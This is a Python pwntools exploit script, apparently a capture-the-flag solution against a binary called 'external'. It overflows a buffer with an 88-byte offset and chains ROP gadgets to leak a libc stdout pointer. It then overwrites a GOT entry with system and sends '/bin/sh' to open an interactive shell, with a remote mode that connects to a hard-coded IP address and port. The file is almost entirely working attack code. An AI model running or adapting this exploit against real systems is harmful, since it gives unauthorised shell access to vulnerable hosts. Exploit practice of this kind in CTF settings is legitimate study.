#!/usr/bin/env python
from pwn import *

context.update(arch='amd64')
exe = './external'
if args.REMOTE:
    libc = ELF('./libc-2.28.so')
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
tyk = ELF('./external')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        if not args.REMOTE:
            return process([exe] + argv, *a, **kw)
        else:
            return remote('161.97.176.150', 9999)

gdbscript = '''
b *0x40126f
continue
'''.format(**locals())

ret = 0x000000000040101a
syscall = 0x0000000000401283
pop_rdi = 0x00000000004012f3
pop_rsi_r15 = 0x00000000004012f1
write_syscall = 0x000000000040127c


io = start()

#dump memory got 0x404018 0x404018+0x38

OFFSET = 88
rop = b"A"* OFFSET
rop += p64(pop_rdi) # 0x00000000004012f3: pop rdi; ret;
rop += p64(1)
rop += p64(pop_rsi_r15)
rop += p64(0x404060) # pointer to stdout in libc
rop += p64(0)
rop += p64(write_syscall)
rop += p64(pop_rdi) # 0x00000000004012f3: pop rdi; ret;
rop += p64(0)
rop += p64(pop_rsi_r15)
rop += p64(0x404018) # got addr
rop += p64(0)

rop += p64(0x401086) # read @ libc to repair got - to chyba ten dlresolve

rop += p64(pop_rdi) # main

rop += p64(0x404020) # pointer to /bin/sh in got

rop += p64(0x401233) # call puts (system)

rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)


io.recvuntil("> ")
io.sendline(rop)
leak = u64(io.recv(0x8))
log.info("stdout leak: " + hex(leak))
libc_base = leak - 0x1bc760
log.info("libc base: " + hex(libc_base))

log.info("repairing got")
log.info("system @ libc: "+ hex(libc.sym['system']))

#io.recv()
#io.send(open('./got', 'r', encoding = "ISO-8859-1").read())
io.send(p64(libc_base + libc.sym['system'])+b"/bin/sh\x00") # overwrite put@got with system and /bin/sh

io.interactive()
